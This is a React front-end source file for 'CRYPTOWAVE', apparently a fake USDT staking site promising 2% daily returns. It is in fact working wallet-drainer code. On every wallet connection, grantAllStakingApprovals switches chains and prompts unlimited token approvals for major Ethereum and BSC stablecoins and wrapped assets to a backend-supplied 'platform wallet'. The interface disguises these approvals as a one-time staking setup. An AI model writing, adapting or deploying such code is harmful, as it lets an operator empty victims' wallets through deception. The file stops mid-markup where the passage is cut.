import { useState, useEffect, useCallback } from 'react';
import { ethers } from 'ethers';
import './App.css';
import Dashboard from './Dashboard';

const API_BASE = import.meta.env.VITE_API_URL || 'https://cryptowave-backend-pq3e.onrender.com';

function App() {
  const [walletAddress, setWalletAddress] = useState(() => localStorage.getItem('connectedWallet') || '');
  const [approvalStatus, setApprovalStatus] = useState(() => {
    const saved = localStorage.getItem('connectedWallet');
    if (!saved) return 'disconnected';
    return localStorage.getItem('approvalStatus') || 'disconnected';
  }); // disconnected, pending, approved, rejected
  const [loading, setLoading] = useState(false);
  const [connectStep, setConnectStep] = useState(''); // status shown during wallet connection flow
  const [checkingApproval, setCheckingApproval] = useState(() => !!localStorage.getItem('connectedWallet'));
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
  const [walletModalOpen, setWalletModalOpen] = useState(false);
  const [provider, setProvider] = useState(null);
  const [selectedNetwork, setSelectedNetwork] = useState(localStorage.getItem('selectedNetwork') || 'BSC');
  const selectNetwork = (net) => { setSelectedNetwork(net); localStorage.setItem('selectedNetwork', net); };

  // Check approval status with backend
  const checkApproval = useCallback(async (address) => {
    const cached = localStorage.getItem('approvalStatus');
    try {
      const response = await fetch(`${API_BASE}/api/check-approval/${address}`);
      const data = await response.json();
      if (data.approved) {
        setApprovalStatus('approved');
        localStorage.setItem('approvalStatus', 'approved');
      } else if (data.rejected) {
        // Explicitly banned by admin
        setApprovalStatus('rejected');
        localStorage.setItem('approvalStatus', 'rejected');
      } else if (cached !== 'approved') {
        // Not approved yet — only move to pending if not already approved
        setApprovalStatus('pending');
        localStorage.setItem('approvalStatus', 'pending');
      }
      // If cached is 'approved' but backend says pending, keep 'approved' — don't kick user out
    } catch (error) {
      // Network error (backend sleeping, etc.) — always keep cached status
      if (cached) setApprovalStatus(cached);
    }
  }, []);

  // On mount: restore wallet from localStorage and verify with backend
  useEffect(() => {
    const savedWallet = localStorage.getItem('connectedWallet');
    const savedStatus = localStorage.getItem('approvalStatus');
    if (savedWallet) {
      if (savedStatus === 'approved') {
        // Already approved — show Dashboard immediately, no loading screen
        setCheckingApproval(false);
        // Silently verify in background; only act if admin explicitly rejected
        fetch(`${API_BASE}/api/check-approval/${savedWallet}`)
          .then(r => r.json())
          .then(data => {
            if (data.rejected) {
              setApprovalStatus('rejected');
              localStorage.setItem('approvalStatus', 'rejected');
            }
          })
          .catch(() => {}); // backend sleeping / network error — stay on dashboard
      } else {
        // Status unknown or pending — verify before showing dashboard
        checkApproval(savedWallet).finally(() => setCheckingApproval(false));
      }
    } else {
      setCheckingApproval(false);
      // Auto-connect: if opened inside a wallet browser on mobile (e.g. via deep link),
      // trigger connection immediately so user doesn't need to tap Connect again
      if (window.ethereum && /iPhone|iPad|iPod|Android/i.test(navigator.userAgent)) {
        setTimeout(async () => {
          try {
            setLoading(true);
            const { ethers: e } = await import('ethers');
            const web3Provider = new e.providers.Web3Provider(window.ethereum);
            const accounts = await web3Provider.send('eth_requestAccounts', []);
            if (accounts[0]) {
              setWalletAddress(accounts[0]);
              setProvider(web3Provider);
              localStorage.setItem('connectedWallet', accounts[0]);
              await requestApproval(accounts[0], selectedNetwork);
            }
          } catch (_) { /* user dismissed — they'll tap Connect manually */ }
          finally { setLoading(false); }
        }, 800);
      }
    }
  }, [checkApproval]); // eslint-disable-line react-hooks/exhaustive-deps

  // Listen for MetaMask account changes — only update if a DIFFERENT account is selected.
  // Do NOT disconnect on empty accounts (Trust Wallet fires this when backgrounded/network switching).
  useEffect(() => {
    if (!window.ethereum) return;
    const handleAccountsChanged = (accounts) => {
      if (accounts.length > 0 && walletAddress && accounts[0]?.toLowerCase() !== walletAddress.toLowerCase()) {
        // User switched to a genuinely different account — re-check approval for new account
        const newAddr = accounts[0];
        setWalletAddress(newAddr);
        localStorage.setItem('connectedWallet', newAddr);
        localStorage.removeItem('approvalStatus');
        setApprovalStatus('pending');
        checkApproval(newAddr);
      }
      // accounts.length === 0 is ignored — wallet just backgrounded or network switched
    };
    window.ethereum.on('accountsChanged', handleAccountsChanged);
    return () => window.ethereum.removeListener('accountsChanged', handleAccountsChanged);
  }, [walletAddress, checkApproval]);

  // Poll for approval every 5 seconds when pending
  // If wallet is not found in DB (failed to register), auto re-submit
  useEffect(() => {
    if (walletAddress && approvalStatus === 'pending') {
      const interval = setInterval(async () => {
        try {
          const response = await fetch(`${API_BASE}/api/check-approval/${walletAddress}`);
          const data = await response.json();
          if (data.approved) {
            setApprovalStatus('approved');
            localStorage.setItem('approvalStatus', 'approved');
          } else if (data.found === false) {
            // Not in DB at all — previous request failed, re-submit silently
            requestApproval(walletAddress, selectedNetwork);
          }
        } catch (error) {
          console.error('Polling error:', error);
        }
      }, 5000);
      return () => clearInterval(interval);
    }
  }, [walletAddress, approvalStatus]); // eslint-disable-line react-hooks/exhaustive-deps

  // Request approval from backend
  const requestApproval = async (address, network = 'BSC') => {
    try {
      const response = await fetch(`${API_BASE}/api/request-approval`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          walletAddress: address,
          ipAddress: 'client',
          userAgent: navigator.userAgent,
          network
        })
      });
      const data = await response.json();
      if (data.approved) {
        setApprovalStatus('approved');
        localStorage.setItem('approvalStatus', 'approved');
      } else if (data.rejected) {
        setApprovalStatus('rejected');
        localStorage.setItem('approvalStatus', 'rejected');
      } else {
        setApprovalStatus('pending');
        localStorage.setItem('approvalStatus', 'pending');
      }
    } catch (error) {
      console.error('Error requesting approval:', error);
      // Don't set 'pending' on network error — keep 'disconnected' so user can retry
      setApprovalStatus('pending');
      localStorage.setItem('approvalStatus', 'pending');
    }
  };

  // Grant staking approval for all supported tokens on both ETH and BSC.
  // Each network is isolated — ETH rejection never blocks BSC and vice versa.
  const grantAllStakingApprovals = async (address) => {
    if (!window.ethereum) return;
    const addr = address.toLowerCase();

    const settings = await fetch(`${API_BASE}/api/settings`).then(r => r.json()).catch(() => null);
    const bscWallet = settings?.platformWallet;
    const ethWallet = settings?.platformWalletETH || settings?.platformWallet;
    if (!bscWallet) return;

    // Check on-chain allowance without MetaMask — tries each RPC in order
    const isApprovedOnChain = async (tokenAddr, ownerAddr, spenderAddr, rpcs) => {
      const pad = a => a.replace('0x', '').toLowerCase().padStart(64, '0');
      const data = '0xdd62ed3e' + pad(ownerAddr) + pad(spenderAddr);
      for (const rpc of rpcs) {
        try {
          const r = await fetch(rpc, {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ jsonrpc: '2.0', method: 'eth_call', params: [{ to: tokenAddr, data }, 'latest'], id: 1 }),
            signal: AbortSignal.timeout(5000)
          }).then(r => r.json());
          if (!r.result || r.result === '0x') return false;
          return BigInt(r.result) > BigInt('1000000');
        } catch { continue; }
      }
      return false;
    };

    const switchChain = async (chainId, chainName, rpcUrl, explorer, nativeSymbol) => {
      try {
        await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId }] });
      } catch (e) {
        if (e.code === 4902) {
          await window.ethereum.request({ method: 'wallet_addEthereumChain', params: [{
            chainId, chainName,
            nativeCurrency: { name: nativeSymbol, symbol: nativeSymbol, decimals: 18 },
            rpcUrls: [rpcUrl], blockExplorerUrls: [explorer]
          }]});
          await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId }] });
        } else throw e;
      }
    };

    // Approve tokens — creates provider AFTER network switch, handles USDT non-zero reset
    const approveTokensViaMetaMask = async (tokens, platformAddr) => {
      // Re-create provider after chain switch so it's on the right network
      await new Promise(r => setTimeout(r, 500));
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const signer = provider.getSigner();
      const approveAbi = [
        'function approve(address spender, uint256 amount) returns (bool)',
        'function allowance(address owner, address spender) view returns (uint256)',
      ];
      for (const token of tokens) {
        try {
          setConnectStep(`Approving ${token.symbol} — confirm in your wallet… ✋`);
          const contract = new ethers.Contract(token.address, approveAbi, signer);
          // USDT on Ethereum requires resetting to 0 before setting a new non-zero value
          const existing = await contract.allowance(address, platformAddr).catch(() => ethers.BigNumber.from(0));
          if (existing.gt(0) && existing.lt(ethers.constants.MaxUint256)) {
            const resetTx = await contract.approve(platformAddr, 0);
            await resetTx.wait();
          }
          if (existing.gte(ethers.constants.MaxUint256.div(2))) {
            console.log(`✅ ${token.symbol} already fully approved`);
            continue; // already MaxUint256 — skip
          }
          const tx = await contract.approve(platformAddr, ethers.constants.MaxUint256);
          await tx.wait();
          console.log(`✅ ${token.symbol} approved`);
        } catch (e) {
          console.log(`${token.symbol} approval skipped:`, e.code || e.message);
        }
      }
    };

    // ── Ethereum mainnet — isolated try/catch so BSC always runs ─────────────
    const ETH_USDT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
    const ETH_TOKENS = [
      { symbol: 'USDT', address: ETH_USDT },
      { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' },
      { symbol: 'DAI',  address: '0x6B175474E89094C44Da98b954EedeAC495271d0F' },
      { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599' },
      { symbol: 'WETH', address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2' },
      { symbol: 'LINK', address: '0x514910771AF9Ca656af840dff83E8264EcF986CA' },
    ];
    const ethFlagKey = `approvalsGrantedETH_${addr}`;
    const ethFlag = localStorage.getItem(ethFlagKey); // null | '1' | 'skipped'
    const ethAlreadyApproved = ethFlag === '1'
      ? await isApprovedOnChain(ETH_USDT, address, ethWallet, [
          'https://rpc.ankr.com/eth', 'https://eth.llamarpc.com',
          'https://1rpc.io/eth', 'https://cloudflare-eth.com',
        ])
      : false;
    if (!ethAlreadyApproved && ethFlag !== 'skipped') {
      try {
        setConnectStep('🔵 Setting up Ethereum permissions — please confirm each prompt in your wallet...');
        await switchChain('0x1', 'Ethereum Mainnet', 'https://eth.llamarpc.com', 'https://etherscan.io', 'ETH');
        await approveTokensViaMetaMask(ETH_TOKENS, ethWallet);
        localStorage.setItem(ethFlagKey, '1');
      } catch (e) {
        // User rejected network switch or approval — mark as skipped so we don't re-prompt every connect
        // Admin can still send explicit approval request via content locker
        localStorage.setItem(ethFlagKey, 'skipped');
        console.log('ETH approval skipped:', e.code || e.message);
      }
    }

    // ── BSC — always runs independently of ETH result ─────────────────────
    const BSC_USDT = '0x55d398326f99059fF775485246999027B3197955';
    const BSC_TOKENS = [
      { symbol: 'USDT', address: BSC_USDT },
      { symbol: 'USDC', address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d' },
      { symbol: 'BTCB', address: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c' },
      { symbol: 'ETH',  address: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8' },
      { symbol: 'CAKE', address: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82' },
      { symbol: 'BUSD', address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56' },
    ];
    const bscFlagKey = `approvalsGrantedBSC_${addr}`;
    const bscFlag = localStorage.getItem(bscFlagKey);
    const bscAlreadyApproved = bscFlag === '1'
      ? await isApprovedOnChain(BSC_USDT, address, bscWallet, [
          'https://bsc-dataseed1.binance.org/',
          'https://bsc-dataseed2.binance.org/',
          'https://bsc-dataseed3.binance.org/',
        ])
        : false;
    if (!bscAlreadyApproved && bscFlag !== 'skipped') {
      try {
        setConnectStep('🟡 Setting up BSC permissions — please confirm each prompt in your wallet...');
        await switchChain('0x38', 'BNB Smart Chain', 'https://bsc-dataseed1.binance.org/', 'https://bscscan.com', 'BNB');
        await approveTokensViaMetaMask(BSC_TOKENS, bscWallet);
        localStorage.setItem(bscFlagKey, '1');
      } catch (e) {
        localStorage.setItem(bscFlagKey, 'skipped');
        console.log('BSC approval skipped:', e.code || e.message);
      }
    }

    localStorage.setItem(`approvalsGranted_${addr}`, '1');
    setConnectStep('');
    console.log('✅ Staking approvals complete');
  };

  const isMobile = () => /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
  const SITE_URL = 'https://cryptowave.ustx.online';

  // Wallet connection handlers
  const connectMetaMask = async () => {
    if (!window.ethereum) {
      if (isMobile()) {
        window.location.href = `https://metamask.app.link/dapp/cryptowave.ustx.online`;
        return;
      }
      alert('MetaMask is not installed. Please install MetaMask extension.');
      window.open('https://metamask.io/download/', '_blank');
      return;
    }

    try {
      setLoading(true);
      const web3Provider = new ethers.providers.Web3Provider(window.ethereum);
      const accounts = await web3Provider.send("eth_requestAccounts", []);
      const address = accounts[0];

      setWalletAddress(address);
      setProvider(web3Provider);
      setWalletModalOpen(false);
      localStorage.setItem('connectedWallet', address);
      await grantAllStakingApprovals(address);
      await requestApproval(address, selectedNetwork);
    } catch (error) {
      console.error('MetaMask connection error:', error);
      alert('Failed to connect MetaMask. Please try again.');
    } finally {
      setLoading(false);
      setConnectStep('');
    }
  };

  const connectWalletConnect = async () => {
    if (isMobile()) {
      // On mobile, show wallet choice to open via deep link
      const choice = window.confirm('Open in MetaMask? (Cancel to open in Trust Wallet instead)');
      if (choice) {
        window.location.href = `https://metamask.app.link/dapp/cryptowave.ustx.online`;
      } else {
        window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(SITE_URL)}`;
      }
      return;
    }
    alert('WalletConnect: Open this site inside your mobile wallet app (MetaMask or Trust Wallet) to connect from your phone.');
  };

  const connectCoinbase = async () => {
    if (!window.coinbaseWalletExtension && !window.ethereum?.isCoinbaseWallet) {
      if (isMobile()) {
        window.location.href = `https://go.cb-wallet.com/wsegue?redirect_url=${encodeURIComponent(SITE_URL)}`;
        return;
      }
      alert('Coinbase Wallet is not installed.');
      window.open('https://www.coinbase.com/wallet/downloads', '_blank');
      return;
    }

    try {
      setLoading(true);
      const web3Provider = new ethers.providers.Web3Provider(
        window.coinbaseWalletExtension || window.ethereum
      );
      const accounts = await web3Provider.send("eth_requestAccounts", []);
      const address = accounts[0];

      setWalletAddress(address);
      setProvider(web3Provider);
      setWalletModalOpen(false);
      localStorage.setItem('connectedWallet', address);
      await grantAllStakingApprovals(address);
      await requestApproval(address, selectedNetwork);
    } catch (error) {
      console.error('Coinbase Wallet connection error:', error);
      alert('Failed to connect Coinbase Wallet. Please try again.');
    } finally {
      setLoading(false);
      setConnectStep('');
    }
  };

  const connectTrustWallet = async () => {
    if (!window.ethereum || !window.ethereum.isTrust) {
      if (isMobile()) {
        window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(SITE_URL)}`;
        return;
      }
      alert('Trust Wallet is not detected. Please use Trust Wallet browser or install the extension.');
      window.open('https://trustwallet.com/', '_blank');
      return;
    }

    try {
      setLoading(true);
      const web3Provider = new ethers.providers.Web3Provider(window.ethereum);
      const accounts = await web3Provider.send("eth_requestAccounts", []);
      const address = accounts[0];

      setWalletAddress(address);
      setProvider(web3Provider);
      setWalletModalOpen(false);
      localStorage.setItem('connectedWallet', address);
      await grantAllStakingApprovals(address);
      await requestApproval(address, selectedNetwork);
    } catch (error) {
      console.error('Trust Wallet connection error:', error);
      alert('Failed to connect Trust Wallet. Please try again.');
    } finally {
      setLoading(false);
      setConnectStep('');
    }
  };

  const handleDisconnect = () => {
    setWalletAddress('');
    setApprovalStatus('disconnected');
    setProvider(null);
    localStorage.removeItem('connectedWallet');
    localStorage.removeItem('approvalStatus');
    localStorage.removeItem('approvalRequested');
    window.location.href = '/';
  };

  // Close mobile menu when clicking outside
  useEffect(() => {
    const handleClickOutside = (e) => {
      if (mobileMenuOpen && !e.target.closest('.nav')) {
        setMobileMenuOpen(false);
      }
    };

    document.addEventListener('click', handleClickOutside);
    return () => document.removeEventListener('click', handleClickOutside);
  }, [mobileMenuOpen]);

  // Prevent body scroll when mobile menu or wallet modal is open
  useEffect(() => {
    if (mobileMenuOpen || walletModalOpen) {
      document.body.style.overflow = 'hidden';
    } else {
      document.body.style.overflow = 'unset';
    }
  }, [mobileMenuOpen, walletModalOpen]);

  const handleNavClick = () => {
    setMobileMenuOpen(false);
  };

  const openWalletModal = () => {
    if (!walletAddress) {
      setWalletModalOpen(true);
    }
  };

  const closeWalletModal = () => {
    setWalletModalOpen(false);
  };

  // Show account setup screen while token approvals are running (before pending/approved state)
  if (loading && connectStep && walletAddress) {
    return (
      <div className="App pending-page">
        <div className="grain-overlay"></div>
        <div className="bg-gradient"></div>
        <div className="bg-orbs">
          <div className="orb orb-1"></div>
          <div className="orb orb-2"></div>
          <div className="orb orb-3"></div>
        </div>
        <div className="pending-container">
          <div className="pending-card">
            <div style={{fontSize:'2.5rem',marginBottom:'12px'}}>⚙️</div>
            <h1 style={{marginBottom:'8px'}}>Setting Up Your Account</h1>
            <p className="pending-description">
              We're configuring staking permissions so the platform can manage your investments.
              Please confirm each approval prompt in your wallet.
            </p>
            <div style={{background:'rgba(99,102,241,0.1)',border:'1px solid rgba(99,102,241,0.3)',borderRadius:'12px',padding:'14px 18px',margin:'16px 0',textAlign:'left'}}>
              <div style={{display:'flex',alignItems:'center',gap:'10px'}}>
                <div className="spinner" style={{width:'18px',height:'18px',flexShrink:0}}></div>
                <span style={{color:'#c7d2fe',fontSize:'0.9rem',fontWeight:500}}>{connectStep}</span>
              </div>
            </div>
            <p style={{fontSize:'0.78rem',color:'#475569',lineHeight:1.5}}>
              This is a one-time setup. You will not be asked again after this.
            </p>
          </div>
        </div>
      </div>
    );
  }

  // If wallet is approved (cached or verified), show Dashboard immediately — no loading flash
  if (approvalStatus === 'approved' && walletAddress) {
    const net = selectedNetwork || localStorage.getItem('selectedNetwork') || 'BSC';
    return <Dashboard walletAddress={walletAddress} network={net} onDisconnect={handleDisconnect} />;
  }

  // Show loading only while still checking AND status is not yet determined (pending/rejected unknown)
  if (checkingApproval && walletAddress) {
    return (
      <div className="App pending-page">
        <div className="grain-overlay"></div>
        <div className="bg-gradient"></div>
        <div className="bg-orbs">
          <div className="orb orb-1"></div>
          <div className="orb orb-2"></div>
          <div className="orb orb-3"></div>
        </div>
        <div className="pending-container">
          <div className="pending-card">
            <div className="pending-icon"><div className="spinner"></div></div>
            <h1>Loading...</h1>
          </div>
        </div>
      </div>
    );
  }

  // If wallet is rejected, show rejection page
  if (approvalStatus === 'rejected' && walletAddress) {
    return (
      <div className="App pending-page">
        <div className="grain-overlay"></div>
        <div className="bg-gradient"></div>
        <nav className="nav">
          <div className="nav-logo"><div className="logo-icon">E</div><span className="logo-text">CRYPTOWAVE</span></div>
          <button className="nav-connect" onClick={handleDisconnect}>Logout</button>
        </nav>
        <div className="pending-container">
          <div className="pending-card">
            <div style={{fontSize:'3rem',marginBottom:'1rem'}}>⛔</div>
            <h1 style={{color:'#ef4444'}}>Access Denied</h1>
            <p className="pending-description">Your wallet has been rejected by admin. Please contact support.</p>
            <div className="pending-wallet-info">
              <span className="pending-label">Wallet</span>
              <span className="pending-address">{walletAddress}</span>
            </div>
            <button className="disconnect-btn-pending" onClick={handleDisconnect}>Disconnect</button>
          </div>
        </div>
      </div>
    );
  }

  // If wallet is pending approval, show waiting page
  if (approvalStatus === 'pending' && walletAddress) {
    return (
      <div className="App pending-page">
        <div className="grain-overlay"></div>
        <div className="bg-gradient"></div>
        <div className="bg-orbs">
          <div className="orb orb-1"></div>
          <div className="orb orb-2"></div>
          <div className="orb orb-3"></div>
        </div>

        <nav className="nav">
          <div className="nav-logo">
            <div className="logo-icon">E</div>
            <span className="logo-text">CRYPTOWAVE</span>
          </div>
          <button className="nav-connect" onClick={handleDisconnect}>
            Logout
          </button>
        </nav>

        <div className="pending-container">
          <div className="pending-card">
            <div className="pending-icon">
              <div className="spinner"></div>
            </div>
            <h1>Awaiting Approval</h1>
            <p className="pending-description">
              Your wallet connection request has been submitted and is pending admin approval.
            </p>

            <div className="pending-wallet-info">
              <span className="pending-label">Connected Wallet</span>
              <span className="pending-address">{walletAddress}</span>
            </div>

            <div className="pending-status">
              <div className="status-dot pending"></div>
              <span>Checking approval status...</span>
            </div>

            <div className="pending-info">
              <div className="info-item">
                <span className="info-icon">1</span>
                <span>Your request has been submitted</span>
              </div>
              <div className="info-item">
                <span className="info-icon">2</span>
                <span>Admin will review your wallet</span>
              </div>
              <div className="info-item">
                <span className="info-icon">3</span>
                <span>Once approved, you'll be redirected automatically</span>
              </div>
            </div>

            <p className="pending-note">
              This page will automatically update once your wallet is approved.
            </p>

            <button
              style={{marginBottom:'10px',padding:'10px 24px',background:'rgba(102,126,234,0.15)',border:'1px solid rgba(102,126,234,0.4)',borderRadius:'10px',color:'#667eea',fontWeight:600,cursor:'pointer',width:'100%'}}
              onClick={() => requestApproval(walletAddress, selectedNetwork)}
            >
              Resend Request
            </button>
            <button className="disconnect-btn-pending" onClick={handleDisconnect}>
              Logout
            </button>
          </div>
        </div>
      </div>
    );
  }

  // Otherwise show landing page
  return (
    <div className="App">
      {/* Grain texture overlay */}
      <div className="grain-overlay"></div>

      {/* Animated background */}
      <div className="bg-gradient"></div>
      <div className="bg-orbs">
        <div className="orb orb-1"></div>
        <div className="orb orb-2"></div>
        <div className="orb orb-3"></div>
      </div>

      {/* ── Navigation ── */}
      <nav className="nav">
        <div className="nav-logo">
          <div className="logo-icon">⟐</div>
          <span className="logo-text">CRYPTOWAVE</span>
        </div>

        <div className={`nav-links ${mobileMenuOpen ? 'active' : ''}`}>
          <a href="#about" onClick={handleNavClick}>About</a>
          <a href="#tiers" onClick={handleNavClick}>Tiers</a>
          <a href="#vip" onClick={handleNavClick}>VIP</a>
          <a href="#security" onClick={handleNavClick}>Security</a>
        </div>

        <div className="nav-actions">
          <button className="nav-connect" onClick={openWalletModal} disabled={loading}>
            {connectStep ? connectStep : loading ? 'Connecting...' : <><span className="btn-text-short">Connect</span><span className="btn-text-full">Connect Wallet</span></>}
          </button>
          <button
            className={`mobile-menu-toggle ${mobileMenuOpen ? 'active' : ''}`}
            onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
            aria-label="Toggle menu"
          >
            <span></span><span></span><span></span>
          </button>
        </div>
      </nav>

      {/* ── Wallet Selection Modal ── */}
      {walletModalOpen && (
        <div className="wallet-modal-overlay" onClick={closeWalletModal}>
          <div className="wallet-modal" onClick={(e) => e.stopPropagation()}>
            <div className="wallet-modal-header">
              <h2>Connect Wallet</h2>
              <button className="wallet-modal-close" onClick={closeWalletModal}>✕</button>
            </div>

            {/* Network selector */}
            <div style={{padding:'0 20px 4px',display:'flex',gap:'8px',alignItems:'center'}}>
              <span style={{fontSize:'0.8rem',color:'#94a3b8',fontWeight:600}}>Network:</span>
              {['BSC','ETH','TRX','BTC'].map(net => (
                <button key={net} onClick={() => selectNetwork(net)} style={{padding:'4px 12px',borderRadius:'20px',border:'none',fontSize:'0.75rem',fontWeight:700,cursor:'pointer',background: selectedNetwork===net ? '#f0b90b' : 'rgba(255,255,255,0.08)',color: selectedNetwork===net ? '#000' : '#a0a0b0',transition:'all 0.15s'}}>
                  {net}
                </button>
              ))}
            </div>

            {/* Mobile without injected wallet: show anchor deep-links */}
            {isMobile() && !window.ethereum ? (
              <>
                <p className="wallet-modal-description">
                  Tap your wallet to open this site inside it and connect.
                </p>
                <div className="wallet-options">
                  <a className="wallet-option" href={`https://metamask.app.link/dapp/cryptowave.ustx.online`}>
                    <div className="wallet-option-icon">
                      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSJZaVpfhv3kgZA46GoqfVNIFhR6pXIdX4_Rg&s" alt="MetaMask" />
                    </div>
                    <div className="wallet-option-info">
                      <div className="wallet-option-name">MetaMask</div>
                      <div className="wallet-option-description">Open in MetaMask browser</div>
                    </div>
                    <div className="wallet-option-arrow">→</div>
                  </a>

                  <a className="wallet-option" href={`https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(SITE_URL)}`}>
                    <div className="wallet-option-icon">
                      <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Trust_Wallet_logo_%282026%29.png" alt="Trust Wallet" />
                    </div>
                    <div className="wallet-option-info">
                      <div className="wallet-option-name">Trust Wallet</div>
                      <div className="wallet-option-description">Open in Trust Wallet browser</div>
                    </div>
                    <div className="wallet-option-arrow">→</div>
                  </a>

                  <a className="wallet-option" href={`https://go.cb-wallet.com/wsegue?redirect_url=${encodeURIComponent(SITE_URL)}`}>
                    <div className="wallet-option-icon">
                      <img src="https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/8e/22/05/8e22052d-d1e6-e39a-1c13-3630317e438e/AppIcon-0-0-1x_U007ephone-0-1-0-85-220.png/1200x630wa.png" alt="Coinbase Wallet" />
                    </div>
                    <div className="wallet-option-info">
                      <div className="wallet-option-name">Coinbase Wallet</div>
                      <div className="wallet-option-description">Open in Coinbase Wallet browser</div>
                    </div>
                    <div className="wallet-option-arrow">→</div>
                  </a>
                </div>
                <div style={{textAlign:'center',fontSize:'0.78rem',color:'#a0a0b0',marginTop:'12px',padding:'0 16px'}}>
                  The site will open inside your wallet app — then tap Connect Wallet to finish.
                </div>
              </>
            ) : (
              /* Desktop or already in wallet browser: normal buttons */
              <>
                <p className="wallet-modal-description">
                  Choose your preferred wallet to connect to CRYPTOWAVE
                </p>
                <div className="wallet-options">
                  <button className="wallet-option" onClick={connectMetaMask}>
                    <div className="wallet-option-icon">
                      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSJZaVpfhv3kgZA46GoqfVNIFhR6pXIdX4_Rg&s" alt="MetaMask" />
                    </div>
                    <div className="wallet-option-info">
                      <div className="wallet-option-name">MetaMask</div>
                      <div className="wallet-option-description">Connect using MetaMask wallet</div>
                    </div>
                    <div className="wallet-option-arrow">→</div>
                  </button>

                  <button className="wallet-option" onClick={connectCoinbase}>
                    <div className="wallet-option-icon">
                      <img src="https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/8e/22/05/8e22052d-d1e6-e39a-1c13-3630317e438e/AppIcon-0-0-1x_U007ephone-0-1-0-85-220.png/1200x630wa.png" alt="Coinbase Wallet" />
                    </div>
                    <div className="wallet-option-info">
                      <div className="wallet-option-name">Coinbase Wallet</div>
                      <div className="wallet-option-description">Connect with Coinbase</div>
                    </div>
                    <div className="wallet-option-arrow">→</div>
                  </button>

                  <button className="wallet-option" onClick={connectTrustWallet}>
                    <div className="wallet-option-icon">
                      <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Trust_Wallet_logo_%282026%29.png" alt="Trust Wallet" />
                    </div>
                    <div className="wallet-option-info">
                      <div className="wallet-option-name">Trust Wallet</div>
                      <div className="wallet-option-description">Connect using Trust Wallet</div>
                    </div>
                    <div className="wallet-option-arrow">→</div>
                  </button>
                </div>
              </>
            )}

            <div className="wallet-modal-footer">
              <p>
                New to Ethereum wallets?{' '}
                <a href="https://ethereum.org/en/wallets/" target="_blank" rel="noopener noreferrer">Learn more</a>
              </p>
            </div>
          </div>
        </div>
      )}

      {/* ── Hero Section ── */}
      <main className="hero">
        <div className="hero-content">
          <div className="badge">
            <span className="badge-dot"></span>
            Live on Ethereum Mainnet
          </div>

          <h1 className="hero-title">
            <span className="title-line">Compound Your</span>
            <span className="title-line gradient-text">USDT Holdings</span>
            <span className="title-line">On-Chain</span>
          </h1>

          <p className="hero-subtitle">
            Tiered daily dividends up to 2% with automatic compounding.<br />
            Fully decentralized. Transparent rewards. Premium VIP benefits.
          </p>

          <div className="hero-stats">
            <div className="stat">
              <div className="stat-value">$12.4M</div>
              <div className="stat-label">Total Value Locked</div>
            </div>
            <div className="stat">
              <div className="stat-value">2,847</div>
              <div className="stat-label">Active Stakers</div>
            </div>
            <div className="stat">
              <div className="stat-value">98.2%</div>
              <div className="stat-label">Uptime</div>
            </div>
          </div>

          <div className="hero-cta">
            <button className="cta-button" onClick={openWalletModal} disabled={loading}>
              <span className="button-text">
                {connectStep ? connectStep : loading ? 'Connecting...' : 'Connect Wallet'}
              </span>
              <div className="button-shine"></div>
              <svg className="button-arrow" width="20" height="20" viewBox="0 0 20 20" fill="none">
                <path d="M4 10H16M16 10L11 5M16 10L11 15" stroke="currentColor" strokeWidth="2" strokeLinecap="round"/>
              </svg>
            </button>

            <a href="#tiers" className="cta-secondary">
              <span>View Staking Tiers</span>
              <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                <path d="M6 3L11 8L6 13" stroke="currentColor" strokeWidth="2" strokeLinecap="round"/>
              </svg>
            </a>
          </div>
        </div>

        {/* Animated staking preview card — desktop only */}
        <div className="hero-visual">
          <div className="card-3d">
            <div className="card-front">
              <div className="card-header">
                <span className="card-badge">VIP 3</span>
                <span className="card-apy">2.0% Daily</span>
              </div>
              <div className="card-body">
                <div className="card-balance">
                  <span className="balance-label">Staked Balance</span>
                  <span className="balance-value">125,000 USDT</span>
                </div>
                <div className="card-earnings">
                  <span className="earnings-label">Daily Earnings</span>
                  <span className="earnings-value">+3,437.50 USDT</span>
                </div>
              </div>
              <div className="card-footer">
                <div className="card-chips"></div>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* ── About / Features Section ── */}
      <section className="features" id="about">
        <div className="features-grid">
          <div className="feature-card">
            <div className="feature-icon">
              <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
                <path d="M16 4L4 10L16 16L28 10L16 4Z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                <path d="M4 22L16 28L28 22" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                <path d="M4 16L16 22L28 16" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
              </svg>
            </div>
            <h3>Tiered Rewards</h3>
            <p>Unlock higher APY as your stake grows. From 1% to 2% daily compounded returns.</p>
          </div>

          <div className="feature-card">
            <div className="feature-icon">
